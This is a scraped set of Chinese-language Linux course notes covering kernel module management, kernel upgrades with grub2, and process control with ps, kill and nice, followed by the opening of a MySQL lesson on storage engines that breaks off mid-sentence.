dl2k.komacvtap.kopppox.kosunhme.ko8139cp.ko dnet.komdio.koppp_synctty.ko tehuti.ko /lib/modules/2.6.32-431.el6.x86_64/kernel/ 该目录下的文件解释 arch 与硬件平台有关的项目 , 例如 CPU 的等级等等 ; crypto 内核所支持的加密的技术 , 例如 md5 、 des 等等 ; drivers 硬件的驱动程序 , 例如显示适配器、网络卡、 PCI 相关硬件 fs 内核所支持的 filesystems , 例如 ext4, vfat, reiserfs, nfs 等等 ; kernel 内核的程序、内核状态、线程、程序的排程 (schedule) 、程序的 signle 等 lib 函式库 mm 内存单元有关的各项数据 net 与网络有关的各项协议数据,还有防火墙模块 sound 音效有关的各项模块2 内核模块的相依性: depmod moudules.dep 文件1234567891011121314[root@rhel6 etc]# head /lib/modules/$(uname -r)/modules.depkernel/arch/x86/kernel/cpu/mcheck/mce-inject.ko:kernel/arch/x86/kernel/cpu/cpufreq/powernow-k8.ko: kernel/drivers/cpufreq/freq_table.kokernel/arch/x86/kernel/cpu/cpufreq/mperf.kokernel/arch/x86/kernel/cpu/cpufreq/mperf.ko:kernel/arch/x86/kernel/cpu/cpufreq/acpi-cpufreq.ko: kernel/drivers/cpufreq/freq_table.kokernel/arch/x86/kernel/cpu/cpufreq/mperf.kokernel/arch/x86/kernel/cpu/cpufreq/pcc-cpufreq.ko:kernel/arch/x86/kernel/cpu/cpufreq/speedstep-lib.ko:kernel/arch/x86/kernel/cpu/cpufreq/p4-clockmod.ko: kernel/drivers/cpufreq/freq_table.kokernel/arch/x86/kernel/cpu/cpufreq/speedstep-lib.kokernel/arch/x86/kernel/cpu/cpufreq/intel_pstate.ko:kernel/arch/x86/kernel/test_nx.ko:kernel/arch/x86/kernel/microcode.ko: depmod 命令depmod [-Ane] 选项与参数 : -A : 不加任何参数时 , depmod 会主动的去分析目前内核的模块 , 并且重新写入/lib/modules/$(uname -r)/modules.dep 当中更新。若加入 -A 参数时 , 则 depmod 会去搜寻比 modules.dep 内还要新的模块,若找到新模块则 -n : 不写入 modules.dep , 而是将结果输出到屏幕上 (standard out); -e : 显示出目前已加载的不可执行的模块名称 depmod 实验假设已经做好一个网卡驱动程序 , 档名为 a.ko, 请更新内核的相依性。 123[root@rhel6 ~]# cp a.ko /lib/modules/2.6.32-431.el6.x86_64/kernel/drivers/net[root@rhel6 ~]# depmod3 内核模块的观察: lsmod, modinfo lsmod 命令作用:显示出目前已经存在于内核当中的模块 , 显示的内容包括 : 模块名称 (Module); 模块的大小 (size); 此模块是否被其他模块所使用 (Used by) 。 modinfo 命令用法: modinfo [-adln] [module_name|filename] 选项与参数 : -a : 仅列出作者名称 ; -d : 仅列出该 modules 的说明 (description); -l : 仅列出授权 (license); -n : 仅列出该模块的详细路径。 内核模块的观察实验首先查看目前已存在于内核中的模块,随便选择一个模块并查看该模块的详细信息。 123456789101112131415161718[root@rhel6 ~]# [root@rhel6 ~]# lsmodModuleSizeUsed byautofs4 26513 38021q 25349 0garp71521 8021q[root@rhel6 ~]# modinfo autofs4filename:/lib/modules/2.6.32-431.el6.x86_64/kernel/fs/autofs4/autofs4.kolicense: GPLsrcversion: 948FC9C8D4043379272927Cdepends:vermagic:2.6.32-431.el6.x86_64 SMP mod_unload modversions 内核模块的加载与移除:insmod, modprobe, rmmodmodprobe 加载模块会主动去搜寻 modules.dep 的内容 , 先解决模块的相依性后 , 再决定需要加载的模块有哪些,很方便; insmod 则完全由使用者自行加载一个完整文件名的模块 , 不会主动分析模块相依性 insmod 命令insmod [/full/path/module_name] [parameters] modprobe 命令modprobe [-lcfr] module_name 选项与参数 : -c : 列出目前系统所有的模块 !( 更详细的代号对应表 ) -l : 列出目前在 /lib/modules/uname -r/kernel 当中的所有模块完整文件 名 ; -f : 强制加载该模块 ; -r : 类似 rmmod , 移除某个模块 rmmod 命令rmmod [-fw] module_name 选项与参数 : -f : 强制将该模块移除掉 , 不管是否正被使用 ; -w : 若该模块正被使用 , 则等该模块被使用完毕后 , 再移除 内核模块的加载与移除实验加载模块;查看该模块是否已成功加载,并查看详细信息;移除该模块。 123456789101112131415161718[root@rhel6 net]# modprobe dnet[root@rhel6 net]# modinfo dnetfilename:/lib/modules/2.6.32-431.el6.x86_64/kernel/drivers/net/dnet.koauthor:Ilya Yanok &lt;yanok@emcraft.com&gt;, Matteo Vit &lt;matteo.vit@dave.eu&gt;description: Dave DNET Ethernet driverlicense:GPLsrcversion: 9D532980E04E93088A9DFC1depends:vermagic:2.6.32-431.el6.x86_64 SMP mod_unload modversions[root@rhel6 net]# lsmod | grep dnetdnet16103 0[root@rhel6 net]# rmmod dnet[root@rhel6 net]# lsmod | grep dnet 内核模块的额外参数设定:/etc/modprobe.d/*.conf123456789101112131415161718192021222324252627282930313233343536[root@rhel6 ~]# ls /etc/modprobe.d/anaconda.conf dist-alsa.conf dist-oss.confblacklist.conf dist.confopenfwwf.conf[root@rhel6 ~]# cat /etc/modprobe.d/dist.conf# default modutils aliasesalias binfmt-204 binfmt_aoutalias binfmt-263 binfmt_aoutalias binfmt-264 binfmt_aoutalias binfmt-267 binfmt_aoutalias binfmt-387 binfmt_aoutalias block-major-1-* rdalias block-major-3-* ide-probe-modalias block-major-8-* sd_modalias block-major-9-* mdalias block-major-11-* sr_modalias block-major-13-* xdalias block-major-15-* cdu31aalias block-major-16-* gscdalias block-major-17-* optcdalias block-major-18-* sjcdalias block-major-20-* mcdxalias block-major-22-* ide-probe-modalias block-major-23-* mcdalias block-major-24-* sonycd535alias block-major-25-* sbpcdalias block-major-26-* sbpcdalias block-major-27-* sbpcdalias block-major-29-* aztcdalias block-major-32-* cm206alias block-major-33-* ide-probe-modalias block-major-34-* ide-probe-modalias block-major-37-* ide-tapealias block-major-44-* ftlalias block-major-46-* pcdalias block-major-47-* pf 内核升级源码编译Linux 内核官网 https://www.kernel.org/ 提供的是源码,需要编译使用。 Linux 内核版本有两种 : 稳定版和开发版 ,Linux 内核版本号由 3 个数字组成 :r.x.y r: 主版本号 x: 次版本号 , 偶数表示稳定版本 ; 奇数表示开发中版本。 y: 修订版本号 , 表示修改的次数 去 http://www.kernel.org 首页 , 可以看到有 stable, longterm 等版本 ,longterm 是比stable 更稳定的版本 , 会长时间更新。 源码编译不做要求。 rpm 包安装在工作中应该去操作系统的发行公司的官网下载已经编译好的内核。我们使用的是红帽的,那么就去红帽的官网 https://www.redhat.com/en/global/china 这里使用一个免费的源 ELRepo 源 rhel6.5 内核升级 —— yum 方式(有网)在 yum 的 ELRepo 源中 , 选择 kernel-lt-3.10.102-1.el6.elrepo.x86_64.rpm 这个版本。 重新启动后的 grub 界面 12[#1#root@rhel6 ~]#uname -r3.10.102-1.el6.elrepo.x86_64 rhel7.2 内核升级 —— 本地 rpm 安装(没网)此处是在 http://rpm.pbone.net 上下载的,实际工作中应该到红帽官网下载。 12345678[root@rhel7 ~]# lsanaconda-ks.cfg DownloadsMusic TemplatesDesktopinitial-setup-ks.cfgPictures VideosDocumentskernel-lt-3.10.102-1.el6.elrepo.x86_64.rpm Public查看但前系统内核版本 12[root@rhel7 ~]# uname -r3.10.0-123.el7.x86_64 安装新内核并保留原内核 12345678[root@rhel7 ~]# rpm -ivh kernel-lt-3.10.102-1.el6.elrepo.x86_64.rpmPreparing...################################# [100%]Updating / installing...1:kernel-lt-3.10.102-1.el6.elrepo ################################# [100%][root@rhel7 ~]# cd /boot/grub2/[root@rhel7 grub2]# ll /etc/grub2.cfglrwxrwxrwx. 1 root root 22 Jul 2 2015 /etc/grub2.cfg -&gt; ../boot/grub2/grub.cfg 查看当前默认启动内核 12[root@rhel7 grub2]# grub2-editenv listsaved_entry=Red Hat Enterprise Linux Linux, with Linux 3.10.0-123.el7.x86_64 查看配置文件中有几个启动项 1234567891011121314[root@rhel7 grub2]# grep &quot;menuentry&quot; /boot/grub2/grub.cfgif [ x&quot;${feature_menuentry_id}&quot; = xy ]; thenmenuentry_id_option=&quot;--id&quot;menuentry_id_option=&quot;&quot;export menuentry_id_optionmenuentry &apos;Red Hat Enterprise Linux Server (3.10.102-1.el6.elrepo.x86_64) 7.0 (Maipo)&apos; --class red--class gnu-linux --class gnu --class os --unrestricted $menuentry_id_option &apos;gnulinux-3.10.0-123.el7.x86_64-advanced-5220f38d-edd6-45e5-a257-f1e9e6c80b4e&apos; {menuentry &apos;Red Hat Enterprise Linux Server, with Linux 3.10.0-123.el7.x86_64&apos; --class red --classgnu-linux --class gnu --class os --unrestricted $menuentry_id_option &apos;gnulinux-3.10.0-123.el7.x86_64-advanced-5220f38d-edd6-45e5-a257-f1e9e6c80b4e&apos; {menuentry &apos;Red Hat Enterprise Linux Server, with Linux 0-rescue-14d17f362db9498eaa56aac326570c37&apos; --class red --class gnu-linux --class gnu --class os--unrestricted $menuentry_id_option &apos;gnulinux-0-rescue-14d17f362db9498eaa56aac326570c37-advanced-5220f38d-edd6-45e5-a257-f1e9e6c80b4e&apos; { 设置默认启动内核 12[root@rhel7 grub2]# grub2-set-default &apos;Red Hat Enterprise Linux Server (3.10.102-1.el6.elrepo.x86_64) 7.0 (Maipo)&apos; 查看当前默认启动内核 12[root@rhel7 grub2]# grub2-editenv listsaved_entry=Red Hat Enterprise Linux Server (3.10.102-1.el6.elrepo.x86_64) 7.0 (Maipo) 更新一下配置 , 让新的内核启动生效 123456789[root@rhel7 grub2]# grub2-mkconfig -o /boot/grub2/grub.cfgGenerating grub configuration file ...Found linux image: /boot/vmlinuz-3.10.102-1.el6.elrepo.x86_64Found initrd image: /boot/initramfs-3.10.102-1.el6.elrepo.x86_64.imgFound linux image: /boot/vmlinuz-3.10.0-123.el7.x86_64Found initrd image: /boot/initramfs-3.10.0-123.el7.x86_64.imgFound linux image: /boot/vmlinuz-0-rescue-14d17f362db9498eaa56aac326570c37Found initrd image: /boot/initramfs-0-rescue-14d17f362db9498eaa56aac326570c37.imgdone 重新启动 1[root@rhel7 grub2]# reboot 查看当前内核版本 12[root@rhel7 ~]# uname -r3.10.102-1.el6.elrepo.x86_64 Linux 内核作业 到共享当中下载 linux 内核 kernel-lt-3.10.102-1.el6.elrepo.x86_64.rpm rhel6.5 进行内核升级,保留原内核 rhel7.2 进行内核升级,保留原内核","link":"/2016/12/22/booboo_linux_base/11-Linux-kernel/"},{"title":"Linux 进程管理","text":"进程 进程： 运行在内存中程序实例 , 进程是程序运行的一种状态 , 是内存中的概念，进程与进程之间无法访问对方私有的内存区域。 线程： 程序运行的最小单元，一个进程可以派生出多个线程，同一个进程内的线程之间可以相互访问彼此内存区域，并且可以共享同一进程的共享内存区域。 进程编号：pid 父进程编号：ppid pstree 命令pstree 命令用以查看进程的结构 常用参数 参数说明 -a 显示每个程序的完整指令，包含路径，参数或是常驻服务的标示。 -c 不使用精简标示法。 -G 使用VT100终端机的列绘图字符。 -h 列出树状图时，特别标明执行的程序。 -H&lt;程序识别码&gt; 此参数的效果和指定”-h”参数类似，但特别标明指定的程序。 -l 采用长列格式显示树状图。 -n 用程序识别码排序。预设是以程序名称来排序。 -p 显示程序识别码。 -u 显示用户名称。 -U 使用UTF-8列绘图字符。 -V 显示版本信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273[root@rhel6 /etc/skel]#pstreeinit─┬─NetworkManager─┬─dhclient│└─{NetworkManager}├─abrtd├─acpid├─anacron├─atd├─auditd───{auditd}├─automount───4*[{automount}]├─bonobo-activati───{bonobo-activat}├─certmonger├─console-kit-dae───63*[{console-kit-da}]├─crond├─cupsd├─2*[dbus-daemon───{dbus-daemon}]├─dbus-launch├─devkit-power-da├─gconfd-2├─gdm-binary─┬─gdm-simple-slav─┬─Xorg││├─gdm-session-wor││├─gnome-session─┬─at-spi-registry│││├─gdm-simple-gree│││├─gnome-power-man│││├─metacity│││├─polkit-gnome-au│││└─{gnome-session}││└─{gdm-simple-sla}│└─{gdm-binary}├─gnome-settings-───{gnome-settings}├─gvfsd├─hald─┬─hald-runner─┬─hald-addon-acpi││└─hald-addon-inpu│└─{hald}├─master─┬─pickup│└─qmgr├─5*[mingetty]├─modem-manager├─polkitd├─pulseaudio───{pulseaudio}├─rhsmcertd├─rpc.statd├─rpcbind├─rsyslogd───3*[{rsyslogd}]├─rtkit-daemon───2*[{rtkit-daemon}]├─sshd───sshd───bash───pstree├─udevd───2*[udevd]└─wpa_supplicant 静态查看进程信息ps ps 查看当前标签页上的进程信息 ps aux 系统进程快照 ps -ef e 所有进程 f 全格式罗列 使用ps aux查看第一列user代表进程的拥有者，第二列PID，第三列占用CPU的百分比，第四列占用内存的百分比，我们说进程占用系统资源，像CPU内存都属于系统资源的一部分，这里都将它显示出来了。接下来，VSZ代表这个占用虚拟内存的大小，RSS代表占用物理内存的大小，以KB为单位。虚拟空间就是当内存不足的时候，把一部分硬盘空间虚拟成内存使用，那么物理内存就是真实存在的真正的内存大小。然后就是处于哪个终端，进程目前的状态，开始时间，和具体的命令。那么进程的状态有哪些呢。S：休眠状态（sleeping）R：等待运行（runable）R Running or runnable (on run queue) 进程处于运行或就绪状态I：空闲状态（idle）&lt; high-priority (not nice to other users) 优先级较高的N low-priority (nice to other users) 优先级较低s is a session leader 进程的领导者l is multi-threaded (using CLONE_THREAD, like NPTL pthreads do) 多线程 is in the foreground process group 在前台进程组 使用ps -ef 查看UID 用户IDPID 进程IDPPID 父进程IDC CPU占用率STIME 开始时间TTY 开始此进程的TTYTIME 此进程运行的总时间CMD 命令名 使用ps -le可以用来查看这个进程的优先级，主要关注优先级，优先级是NI这一列，其他先不用关注 pgrep用来过滤进程号 123456789101112[root@rhel6 ~]# pgrep -l ping &lt;== 截取进程号 pid27706 ping[root@rhel6 ~]# pgrep -lU student &lt;== 指定用户截取进程号 pid27736 bash27762 ping[root@rhel6 ~]# pgrep -l -t pts/1 &lt;== 指定登陆端口截取进程号 pid2568 bash27735 su27736 bash1.2.3 pidof[root@rhel6 ~]# pidof Xorg &lt;== 只显示进程的进程号 pid15262 动态查看进程信息top 终端提示符不显示 【 d 】修改默认刷新频率 , 默认 3s 【 P 】以 cup 占用百分比进行排序 【 M 】以内存的占用情况排序 【 h 】显示帮助信息 【 &lt;&gt; 】翻页 【 k 】杀掉进程 kill 停止进程Linux中的 kill 命令用来停止指定的进程( terminate a process )的运行，是 Linux下进程管理的常用命令。 通常情况下停止一个前台进程可以使用 Ctrl+C 组合键，但是对于一个运行在后台进程需要用 kill命令来终止，我们就需要先使用 ps、pidof、pstree和top 等工具获取进程 PID ，然后使用 kill 命令来杀掉该进程。 kill 命令是通过向进程发送指定的信号来结束相应进程的。在默认情况下,采用编号为15 的 TERM 信号。 TERM 信号将终止所有不能捕获该信号的进程。 对于那些可以捕获该信号的进程就要用编号为 9 的 kill 信号,强行 “ 杀掉 ” 该进程。 命令格式 kill [参数][进程号] 命令功能： 发送指定的信号到相应进程。不指定型号将发送 SIGTERM ( 15 )终止指定进程。如果任无法终止该程序可用 “ -KILL” 参数，其发送的信号为 SIGKILL(9) ，将强制结束进程,使用 ps 命令或者 jobs 命令可以查看进程号。 root 用户将影响用户的进程,非 root 用户只能影响自己的进程。 命令参数： 参数 说明 -l 信号,若果不加信号的编号参数,则使用 “ -l” 参数会列出全部的信号名称 -a 当处理当前进程时,不限制命令名和进程号的对应关系 -p 指定 kill 命令只打印相关进程的进程号,而不发送任何信号 -s 指定发送信号 -u 指定用户 killall用于关掉多个同名的进程 killall -9 ping ===&gt;关掉所有的ping进程 pkill使用pkill命令可以根据进程的名称／运行该进程的用户／进程所在的终端等等属性来终止特定的进程pkill -9 -t 终端名 ===&gt;关掉由该终端开启的进程pkill -9 -U 用户名 ===&gt;关掉由该用户开启的进程 xkill哪里关不掉点哪里 主要用于停止图形化（GUI）程序 进程优先级NI nice 数字表示 : -20-19 数字越小 , 等级越高 ps -le | grep ping &lt;== 查看 ping 的优先级 指定优先级nice -n 3 ping 172.0.0.1 普通用户不能指定比 0 小的优先级 ， root 用户随意 普通用户只能做贡献，上帝随意设置优先级 调整优先级renice -n [-20-19] [pid] &lt;== 调整优先级 root 可以升高也可降低nice值，代表可以设置优先级更低可以设置优先级更高。 普通用户只能升高nice值，代表只能降低优先级。 12345678910[root@rhel6 ~]#nice -n 3 ping 172.25.0.10[root@rhel6 ~]#nice -n 5 ping 172.25.0.10[root@rhel6 ~]#ps -le|grep ping4 S 0 26613 26536 0 83 3 - 25812 skb_re pts/1 00:00:00 ping4 S 0 26614 26567 0 85 5 - 25812 skb_re pts/2 00:00:00 ping[root@rhel6 ~]#renice -n -1 2661326613: old priority 3, new priority -1[root@rhel6 ~]#ps -le|grep ping4 S 0 26613 26536 0 79 -1 - 25812 skb_re pts/1 00:00:00 ping4 S 0 26614 26567 0 85 5 - 25812 skb_re pts/2 00:00:00 ping 前后台作业 &amp; 在创建进程的过程中 , 将前台作业放置到后台的方法 ，在命令后面加上 &amp; jobs 查看后台进程 fg 将后台作业调用到前台 ctrl+z 将已经触发的前台作业调到后台 , 后台作业暂停 bg 让后台作业执行 12345678910111213141516171819202122232425262728293031[root@rhel6 ~]#ping 172.25.0.11 &gt;/dev/null &amp;[1] 26712[root@rhel6 ~]#ping 172.25.0.10 &gt;/dev/null &amp;[2] 26713[#13#root@rhel6 ~]#jobs[1]- Runningping 172.25.0.11 &gt; /dev/null &amp;[2]+ Runningping 172.25.0.10 &gt; /dev/null &amp;[root@rhel6 ~]#fg 2ping 172.25.0.10 &gt; /dev/null^Z[2]+ Stoppedping 172.25.0.10 &gt; /dev/null[root@rhel6 ~]#bg 2[2]+ ping 172.25.0.10 &gt; /dev/null &amp;[root@rhel6 ~]#ps -ef|grep pingroot 26712 26567 0 18:16 pts/2 00:00:00 ping 172.25.0.11root 26713 26567 0 18:16 pts/2 00:00:00 ping 172.25.0.10root 26717 26567 0 18:17 pts/2 00:00:00 grep ping[root@rhel6 ~]#kill 26712[root@rhel6 ~]#jobs[1]- Terminatedping 172.25.0.11 &gt; /dev/null[2]+ Runningping 172.25.0.10 &gt; /dev/null &amp;[root@rhel6 ~]#kill 26713[root@rhel6 ~]#jobs[2]+ Terminatedping 172.25.0.10 &gt; /dev/null[#21#root@rhel6 ~]#jobs 进程管理课后作业进程管理 关于父进程和子进程的实验:打开一个终端登陆 ssh root@rhel7-fN 进入输入密码的状态,先不输入密码,查看进程;输入 密码后再查看进程。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556rhel7[root@rhel7 ~]# ps -ef|grep bashroot 642 1 0 02:46 ? 00:00:00 /bin/bash /usr/sbin/ksmtunedroot 7844 7839 1 06:29 pts/0 00:00:00 -bash[root@rhel7 ~]# ps -ef|grep sshroot 1261 1 0 02:46 ? 00:00:00 /usr/sbin/sshd -Droot 7839 1261 0 06:29 ? 00:00:00 sshd: root@pts/0root 7892 1261 0 06:29 ? 00:00:00 sshd: root [priv]sshd 7893 7892 0 06:29 ? 00:00:00 sshd: root [net]root 7906 7844 0 06:30 pts/0 00:00:00 grep --color=auto ssh[root@rhel7 ~]# ps -ef|grep bashroot 642 1 0 02:46 ? 00:00:00 /bin/bash /usr/sbin/ksmtunedroot 7844 7839 0 06:29 pts/0 00:00:00 -bashroot 7915 7892 0 06:30 pts/1 00:00:00 -bashroot 7957 7844 0 06:30 pts/0 00:00:00 grep --color=auto bash[root@rhel7 ~]# ps -ef|grep 7892root 7892 1261 0 06:29 ? 00:00:00 sshd: root@pts/1root 7915 7892 0 06:30 pts/1 00:00:00 -bash[root@rhel7 ~]# ps -ef|grep 1261root 1261 1 0 02:46 ? 00:00:00 /usr/sbin/sshd -Droot 7839 1261 0 06:29 ? 00:00:00 sshd: root@pts/0root 7892 1261 0 06:29 ? 00:00:00 sshd: root@pts/1[root@rhel7 ~]# ps -ef|grep 1|head -n 1root 1 0 0 02:46 ? 00:00:03 /usr/lib/systemd/systemd --switched-root --system --deserialize 20rhel6[root@rhel6 ~]#ps -ef|grep sshroot 1421 1 0 15:56 ? 00:00:00 /usr/sbin/sshdroot 26564 1421 0 17:36 ? 00:00:00 sshd: root@pts/2root 26750 1421 0 18:25 ? 00:00:00 sshd: root@pts/3root 26829 26803 0 18:29 pts/3 00:00:00 ssh root@172.25.0.10root 26848 26567 0 18:37 pts/2 00:00:00 grep ssh[root@rhel6 ~]#ps -ef|grep sshroot 1421 1 0 15:56 ? 00:00:00 /usr/sbin/sshdroot 26564 1421 0 17:36 ? 00:00:00 sshd: root@pts/2root 26750 1421 0 18:25 ? 00:00:00 sshd: root@pts/3root 26829 26803 0 18:29 pts/3 00:00:00 ssh root@172.25.0.10root 26849 1421 0 18:37 ? 00:00:00 sshd: [accepted]sshd 26850 26849 0 18:37 ? 00:00:00 sshd: [net] root 26852 26567 0 18:37 pts/2 00:00:00 grep ssh[root@rhel6 ~]#ps -ef|grep sshroot 1421 1 0 15:56 ? 00:00:00 /usr/sbin/sshdroot 26564 1421 0 17:36 ? 00:00:00 sshd: root@pts/2root 26750 1421 0 18:25 ? 00:00:00 sshd: root@pts/3root 26829 26803 0 18:29 pts/3 00:00:00 ssh root@172.25.0.10root 26849 1421 1 18:37 ? 00:00:00 sshd: root@pts/0root 26874 26567 0 18:38 pts/2 00:00:00 grep ssh[root@rhel6 ~]#ps -ef|grep 1421root 1421 1 0 15:56 ? 00:00:00 /usr/sbin/sshdroot 26564 1421 0 17:36 ? 00:00:00 sshd: root@pts/2root 26750 1421 0 18:25 ? 00:00:00 sshd: root@pts/3root 26849 1421 0 18:37 ? 00:00:00 sshd: root@pts/0root 26877 26567 0 18:38 pts/2 00:00:00 grep 1421[root@rhel6 ~]#ps -ef|grep 1|head -n 1root 1 0 0 15:55 ? 00:00:01 /sbin/init 创建多个vi 进程，并使其运行在系统后台，设置vi 后台进程的优先级（nice）值，分别为1、5、15、17，并随后将其统一修改为18。 观察top命令的显示信息，找出当前占用cpu、内存、I/O资源最多的进程号和进程名。","link":"/2016/12/22/booboo_linux_base/13-pid/"},{"title":"MySQL 管理课程 第六课 MySQL逻辑架构和Innodb存储引擎","text":"MySQL 逻辑架构 MySQL 逻辑架构由：连接池组件、管理服务和工具组件、sql接口组件、查询分析器组件、优化器组件、 缓冲组件、插件式存储引擎、物理文件组成。独有的插件式体系结构，各个存储引擎有自己的特点。 Connectors指的是不同语言中与SQL的交互 Management Serveices &amp; Utilities： 系统管理和控制工具 Connection Pool: 连接池。管理缓冲用户连接，线程处理等需要缓存的需求 SQL Interface: SQL接口。接受用户的SQL命令，并且返回用户需要查询的结果。比如select from就是调用SQL Interface Parser: 解析器。SQL命令传递到解析器的时候会被解析器验证和解析。解析器是由Lex和YACC实现的，是一个很长的脚本。 主要功能： a . 将SQL语句分解成数据结构，并将这个结构传递到后续步骤，以后SQL语句的传递和处理就是基于这个结构的 b. 如果在分解构成中遇到错误，那么就说明这个sql语句是不合理的 Optimizer: 查询优化器。SQL语句在查询之前会使用查询优化器对查询进行优化。他使用的是“选取-投影-联接”策略进行查询。 用一个例子就可以理解： select uid,name from user where gender = 1; 这个select 查询先根据where 语句进行选取，而不是先将表全部查询出来以后再进行gender过滤；这个select查询先根据uid和name进行属性投影，而不是将属性全部取出以后再进行过滤；将这两个查询条件联接起来生成最终查询结果 Cache和Buffer： 查询缓存。 如果查询缓存有命中的查询结果，查询语句就可以直接去查询缓存中取数据。这个缓存机制是由一系列小缓存组成的。比如表缓存，记录缓存，key缓存，权限缓存等 Engine ：存储引擎。 存储引擎是MySql中具体的与文件打交道的子系统。也是Mysql最具有特色的一个地方。 Mysql的存储引擎是插件式的。它根据MySQL AB公司提供的文件访问层的一个抽象接口来定制一种文件访问机制（这种访问机制就叫存储引擎） 现在有很多种存储引擎，各个存储引擎的优势各不一样，最常用的MyISAM,InnoDB MySQL 5.5 版本之前默认使用MyISAM引擎，它查询速度快，有较好的索引优化和数据压缩技术。但是它不支持事务。 MySQL 5.5 版本开始默认使用InnoDB引擎，它是第一个支持拥有ACID特性事务的存储引擎，并且提供行级的锁定，应用也相当广泛。 Mysql也支持自己定制存储引擎，甚至一个库中不同的表使用不同的存储引擎，这些都是允许的。 MySQL 存储引擎存储引擎概述innodb存储引擎：面向OLTP(online transaction processing)、行锁、支持外键、非锁定读、默认采用repeaable级别（可重复读）通过next-keylocking策略避免幻读、插入缓冲、二次写、自适应哈希索引、预读 myisam存储引擎：不支持事务、表锁、全文索引、适合olap（在线分析处理），其中myd:放数据文件，myi:放索引文件 ndb存储引擎：集群存储引擎，share nothing，可提高可用性 memory存储引擎：数据存放在内存中，表锁，并发性能差，默认使用哈希索引 archive存储引擎：只支持insert和select ，zlib算法压缩1：10，适合存储归档数据如日志等、行锁 maria存储引擎：目的取代myisam、缓存数据和索引、行锁、mvcc 知名的两大存储引擎存储引擎是数据库当中非常重要的概念，这是一个重点。什么是存储引擎呢？引擎这个东西是用在车上的，说车子跑快跑慢，最直接的关系，引擎，当然不是唯一的关系。就像我们说计算机cpu是最直接的原因。对汽车来说呢，就是引擎最关键。数据库他的优点是数据读写比较快，那么他读写之所以比一般的应用程序快，那是因为他读写的方式不一样。我们把数据库读数据，读文件，写数据，写文件，那种读写操作的方法叫做存储引擎。指的是“DB读写数据的方式”。简单的一句话概括，数据库读写数据的方式叫做存储引擎。读写数据的方式会直接影响到数据库性能，所以是非常重要的。mysql用的是两大存储引擎，一个叫做myisam存储引擎，第二个叫做innodb存储引擎，这是最常见的、最知名的存储引擎，myisam和innodb存储引擎。其实还有其他存储引擎，大概我记得mysql支持8个不同的存储引擎，可能后来呢又扩容了，但是不管有几个，最常用的就是这么两个。 这两个存储引擎有各自的优劣点，有各自的特性。比如说，两个最大的区别，myisam是一个非事务型的存储引擎，可以支持表锁，或者说只支持表锁；innodb是一个事务型存储引擎，能够支持到行锁。这是两个特性，不是说事务型存储就能支持行锁，这是两个不同的特点，一个特点是事务型和非事务型，一个特点是行锁与表锁。实现行锁，其实大部分引擎实现的都是表锁，实现表锁的存储引擎不多，innodb是其中一个，ndb也是一个，比较著名的能够实现行锁的存储引擎。 INNODB可以实现行锁，所以INNODB在线上生存环境中，大并发用户请求下，他的性能损失并不大；而MYISAM用的是表锁，一旦并发用户数量多了，性能会急剧下降，随着他们用户数量的增加，冲突会明显增加，冲突次数越多，性能越低，排队用户越多。我们这里总结一下，我们推荐线上生产环境尽量使用INNODB，会有很多优点；但如果不涉及到锁冲突，不涉及到事务型，或者说不涉及到写操作，比如我这台服务器专门用来读，那么这个时候MYISAM的读性能是大于INNODB的，他是适合于小并发下面的读多写少的环境。锁行比锁表要麻烦，锁精度越精细，操作起来肯定越麻烦，所以在只读的环境下，用MYISAM肯定性能会高一些。多数情况下MYISAM存储引擎呢是给管理员做统计用的。管理员有一个数据库要去分析数据，一个人分析就够了，不会说有一千个用户同时登上去，大家一起分析，不会的。而且分析数据库，很多都是用的读环境，这个表当中有多少记录，哪个表当中有多少记录，表当中最大值是多少，最小值是多少，相对于上一次的统计结果我有什么样的改变，很多时候都是读操作。所以像这种线下数据统计分析比较适合于MYISAM。另外提一下，还有一种情况下也会用MYISAM。在做主从同步的时候，也称为A/B复制。有一台服务器叫做Master，有一堆从服务器叫做Slave，Master用来做写操作，写完以后同步给从机，从机只用来做读操作。那么从机就是一个只读环境，用MYISAM数据库引擎，是不是符合我们读多写少的环境啊，而主服务器用INNODB，这也是一种架构的方式，了解一下，有的公司比较追求读性能就会用这种架构，但是我们大多数时候是主从都用INNODB。 接下来我们一起来了解一下MYSQL和MARIADB默认的存储引擎是什么，就是说你什么操作都不改，做数据读写的时候默认使用的存储引擎。MYSQL有几个不同的版本，在SUN公司手下的时候，有5.0版本和5.1版本，默认使用MYISAM存储引擎；后来被ORACLE收购之后的第一版本是5.5，开发的第二个版本是5.6，现在最新的版本是5.7，ORACLE收购完默认的存储引擎是INNODB。MARIADB有5.0，5.1相对于MYSQL的5.0和5.1，有一个MYSQL版本，就会有一个MARIADB版本。RHEL7默认用的MARIADB 5.5版本，MYSQL有5.6版本，MARIADB对应的是10版本，MYSQL 5.7版本，对应的是MARIADB 10.1版本。MARIADB说我以后不会跟着你的版本走，因为我后期开发的过程中，功能比你多，所以我版本跟你一样，会让用户有一个错误的判断，认为好像我有的功能MYSQL也有，而事实上MYSQL没有，我是超越MYSQL的。ORACLE官方说，MYSQL 5.6版本性能要高出5.5版本的30%，相同的硬件，相同的机器上面，性能要高出30%。5.7相对于5.6高70%，这东西一般来说，我们在性能调优的时候是很难想象的，在相同的硬件上面，因为程序稍作修改让性能提升这么大。一般来说程序版本升级之后，性能增加个5%-10%，这是在一个可以理解的，通常的方案当中，但是ORACLE说能提升70%，他的确做了很多的修改。所以我的建议是，如果大家使用MYSQSL，那么起码要从5.6开始使用，最好是使用5.7版本，性能是一个问题，还有后面诸多问题，例如安全性问题、高可用的问题、很多延迟性的问题都得到了ORACLE公司非常有效的解决！当然ORACLE这么做也是有他的原因的，因为太多的人去使用MARIADB了，他如果不在MYSQL上作出一些重大的突破，就没人愿意去用MYSQL了，所以他还是有了非常大的改进。当然MARIADB也有了改进，你有的功能我也有，如果用MARIADB，我建议用10版本，这个倒不是性能问题，主要是一些新特性，和安全相关的一些特性，还有功能相关的一些特性，5.5版本确实是缺少了一些非常重要的一些特性，所以建议你上10或者10.1版本。我们的课程当中还是以mariadb的5.5版本，因为常见的基础操作不管哪个版本都一样，基础讲完了会用mysql的5.7版本或者mariadb10.1版本，讲一些他们具有的新特性。以默认版本去讲基础操作，再以新版本去讲新特性。 INNODB 的特性 主体系结构：默认7个后台线程，4个io thread(insert buffer、log、read、write),1个master thread(优先级最高),1个锁(lock)监控线程，1个错误监控线程。可以通过show engine innodb status来查看。新版本已对默认的read thread和write thread分别增大到4个，可通过show variables like &apos;innodb_io_thread%&apos;查看。 存储引擎组成：缓冲池(buffer 